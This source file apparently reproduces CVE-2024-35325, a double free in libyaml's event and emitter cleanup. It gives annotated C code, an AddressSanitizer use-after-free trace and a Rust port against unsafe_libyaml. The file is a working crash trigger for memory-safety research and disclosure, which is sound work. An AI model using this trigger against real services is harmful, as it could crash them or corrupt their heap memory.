/* c code
 * CVE-2024-35325

void poc() {
    yaml_document_t document;
    memset(&document, 0, sizeof(yaml_document_t));
    yaml_document_initialize(&document, NULL, NULL, NULL, 0, 0);

    yaml_event_t event;
    memset(&event, 0, sizeof(yaml_event_t));
    int encoding = YAML_ANY_ENCODING;

    yaml_document_add_sequence(&document, YAML_NULL_TAG, YAML_ANY_SEQUENCE_STYLE);

    // step1: allocated by yaml_strdup(anchor) at api.c:887
    yaml_sequence_start_event_initialize(&event, "anchor", YAML_NULL_TAG, 0, YAML_ANY_SEQUENCE_STYLE);

    yaml_emitter_t emitter;
    memset(&emitter, 0, sizeof(yaml_emitter_t));
    yaml_emitter_initialize(&emitter);

    // step2: yaml_emitter_emit call ENQUEUE (emitter.c:288) copy data from event to emitter.events.tail -> (*((queue).tail++) = value, 1)
    yaml_emitter_emit(&emitter, &event);
    // step3: first free at api.c:400 -> yaml_event_delete(&DEQUEUE(emitter, emitter->events));
    yaml_emitter_delete(&emitter);
    // step4: double free at api.c:1015
    yaml_event_delete(&event);

    yaml_document_delete(&document);
}
*/

/* ASAN in rust

==3049101==ERROR: AddressSanitizer: heap-use-after-free on address 0x502000000030 at pc 0x563685e760c3 bp 0x7fffc934c090 sp 0x7fffc934c088
READ of size 8 at 0x502000000030 thread T0
    #0 0x563685e760c2  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x14a0c2) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #1 0x563685e79651  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x14d651) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #2 0x563685e70901  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x144901) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #3 0x563685e739d8  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x1479d8) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #4 0x563685e48135  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x11c135) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #5 0x563685e47ac5  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x11bac5) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #6 0x563685e48b3a  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x11cb3a) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #7 0x563685e4862d  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x11c62d) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #8 0x563685e485b3  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x11c5b3) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #9 0x563685eaa7e1  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x17e7e1) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #10 0x563685e87713  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x15b713) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #11 0x563685e8e3ea  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x1623ea) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #12 0x563685e8713e  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x15b13e) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #13 0x563685e9eada  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x172ada) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #14 0x563685f6871b  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x23c71b) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #15 0x563685e87502  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x15b502) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #16 0x563685e8e3ea  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x1623ea) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #17 0x563685e86ec9  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x15aec9) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #18 0x563685e9eb1a  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x172b1a) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #19 0x563685f6834b  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x23c34b) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #20 0x563685e48508  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x11c508) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #21 0x563685e47aed  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x11baed) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #22 0x7fc5870e4082  (/lib/x86_64-linux-gnu/libc.so.6+0x24082) (BuildId: 87b331c034a6458c64ce09c03939e947212e18ce)
    #23 0x563685d992bd  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x6d2bd) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)

0x502000000030 is located 0 bytes inside of 15-byte region [0x502000000030,0x50200000003f)
freed by thread T0 here:
    #0 0x563685e1d866  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0xf1866) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #1 0x563685eefe28  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x1c3e28) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #2 0x563685e7967a  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x14d67a) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #3 0x563685e47ac5  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x11bac5) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #4 0x563685e9eada  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x172ada) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #5 0x563685e87502  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x15b502) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #6 0x563685e9eb1a  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x172b1a) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #7 0x563685e48508  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x11c508) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #8 0x563685e47aed  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x11baed) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)

previously allocated by thread T0 here:
    #0 0x563685e1daff  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0xf1aff) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #1 0x563685eefb8b  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x1c3b8b) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #2 0x563685ff97ca  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x2cd7ca) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #3 0x563685e793f0  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x14d3f0) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #4 0x563685e480bd  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x11c0bd) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #5 0x563685e47ac5  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x11bac5) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #6 0x563685e9eada  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x172ada) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #7 0x563685e87502  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x15b502) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #8 0x563685e9eb1a  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x172b1a) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #9 0x563685e48508  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x11c508) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
    #10 0x563685e47aed  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x11baed) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)

SUMMARY: AddressSanitizer: heap-use-after-free (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x14a0c2) (BuildId: 1c624e737a74e06753b8d006356c1df0c51a3547)
Shadow bytes around the buggy address:
  0x501ffffffd80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x501ffffffe00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x501ffffffe80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x501fffffff00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x501fffffff80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x502000000000: fa fa 07 fa fa fa[fd]fd fa fa fa fa fa fa fa fa
  0x502000000080: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x502000000100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x502000000180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x502000000200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x502000000280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==3049101==ABORTING

 */

use std::{mem::MaybeUninit, ptr::null_mut};
use unsafe_libyaml::*;

pub fn poc() {
    unsafe {
        let mut document = MaybeUninit::<yaml_document_t>::uninit();
        let document = document.as_mut_ptr();
        let null_tag: *mut yaml_tag_directive_t = null_mut::<yaml_tag_directive_t>();
        let null_version: *mut yaml_version_directive_t = null_mut::<yaml_version_directive_t>();
        let _ = yaml_document_initialize(document, null_version, null_tag, null_tag, false, false);

        let mut event = MaybeUninit::<yaml_event_t>::uninit();
        let event = event.as_mut_ptr();

        let null_tag = std::ffi::CString::new("tag:yaml.org,2002:null")
            .unwrap()
            .into_raw();
        let _ =
            yaml_document_add_sequence(document, null_tag as *const u8, YAML_ANY_SEQUENCE_STYLE);

        let anchor = std::ffi::CString::new("anchor").unwrap().into_raw();
        let _ = yaml_sequence_start_event_initialize(
            event,
            anchor as *const u8,
            null_tag as *const u8,
            false,
            YAML_ANY_SEQUENCE_STYLE,
        );

        let mut emitter = MaybeUninit::<yaml_emitter_t>::uninit();
        let emitter = emitter.as_mut_ptr();
        let _ = yaml_emitter_initialize(emitter);
        let _ = yaml_emitter_emit(emitter, event);
        yaml_emitter_delete(emitter);
        yaml_event_delete(event);
        yaml_document_delete(document);
    }
}
